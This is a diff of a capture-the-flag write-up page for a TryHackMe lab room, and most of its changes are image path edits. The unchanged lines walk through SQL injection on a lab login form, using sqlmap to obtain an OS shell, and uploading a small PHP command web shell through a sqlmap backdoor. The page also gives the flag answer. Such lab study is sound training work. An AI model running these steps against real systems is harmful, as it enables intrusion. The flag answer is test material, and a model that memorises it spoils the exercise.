@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me/rooms/weaponizing-vulnerabilities/","created":"2025-03-10T17:27:16.376-04:00","updated":"2025-03-11T00:32:59.471-04:00"}
+{"dg-publish":true,"permalink":"/try-hack-me/rooms/weaponizing-vulnerabilities/","created":"2025-03-10T17:27:16.376-04:00","updated":"2025-03-11T00:37:03.699-04:00"}
 ---
 
 # Task 1 - Introduction
@@ -165,12 +165,12 @@ First went to the website given, "`http://10.10.127.78/ai/login.php`"
 
 First used a valid email address with a provided password
 
-![](../THM_Images/Pasted%20image%2020250310235445.png)
+![](/img/user/TryHackMe/THM_Images/Screenshot 2025-03-10 235433.png)
 ![](/img/user/TryHackMe/THM_Images/9ef0e30c5c0500c7a490ecbb5a49f0f6.png)
 
 Then tried again, but this time the email being `test@chatai.com'`
 
-![](../THM_Images/Pasted%20image%2020250310235520.png)
+![](/img/user/TryHackMe/THM_Images/Screenshot 2025-03-10 235519.png)
 
 ![](/img/user/TryHackMe/THM_Images/d1fef0c8512e5806a256d6304e888c6f.png)
 
@@ -186,7 +186,7 @@ Need to get a endpoint by intercepting calls in order to use `sqlmap` to exploit
 
 ![](/img/user/TryHackMe/THM_Images/82f180ec7c48fbb106de68ebb1a0a019.png)
 
-![](../THM_Images/Pasted%20image%2020250311000101.png)
+![](/img/user/TryHackMe/THM_Images/Screenshot 2025-03-11 000100.png)
 
 Got the intercepted URL, ``http://10.10.127.78/ai/includes/user_login.php?email=test%40chatai.com&password=123
 
@@ -194,13 +194,13 @@ Used the **sqlmap** command, `sqlmap -u "http://10.10.127.78/ai/includes/user_lo
 
 ![](/img/user/TryHackMe/THM_Images/1c1c144b573fa89cb8b50f9e9262ddf5.png)
 
-![](../THM_Images/Pasted%20image%2020250311001347.png)
+![](/img/user/TryHackMe/THM_Images/Screenshot 2025-03-11 001345.png)
 
 Once done running, sqlmap creates a OS shell that we can use to navigate through the target machine.
 
 ![](/img/user/TryHackMe/THM_Images/ab4c165eb3a2cda01ee48ab19c48f2a1.png)
 
-![](../THM_Images/Pasted%20image%2020250311001515.png)
+![](/img/user/TryHackMe/THM_Images/Screenshot 2025-03-11 001443.png)
 
 Sqlmap also creates a backdoor located on `http://10.10.127.78:80/tmpubngv.php` that we can use to upload any files we want.
 
@@ -220,13 +220,13 @@ if(isset($_REQUEST['cmd']))
 
 ![](/img/user/TryHackMe/THM_Images/453868b6cdea49063cf0cbc658f66bc2.png)
 
-![](../THM_Images/Pasted%20image%2020250311002402.png)
+![](/img/user/TryHackMe/THM_Images/Screenshot 2025-03-11 002131.png)
 
 Navigate to the website `http://10.10.127.78:80/tmpubngv.php` and upload the `hack.php` file
 
 ![](/img/user/TryHackMe/THM_Images/6b722c41ae655753d0529d7f115c1d0c.png)
 
-![](../THM_Images/Pasted%20image%2020250311002222.png)
+![](/img/user/TryHackMe/THM_Images/Screenshot 2025-03-11 002222.png)
 
 Allows us to put in commands in the URL to access the backdoor like http://10.10.127.78:80/hack.php?cmd=dir
 
@@ -237,7 +237,7 @@ Allows us to put in commands in the URL to access the backdoor like http://10.10
 >  **Have you noticed the file flag.txt in the web root directory? What is the flag value?**
 
 ![](/img/user/TryHackMe/THM_Images/a55162788292d089e032b79da7cae161.png)
-![](../THM_Images/Pasted%20image%2020250311002712.png)
+![](/img/user/TryHackMe/THM_Images/Screenshot 2025-03-11 002710.png)
 
 > [!Success] Answer
 > THM{010101_PAWNED}
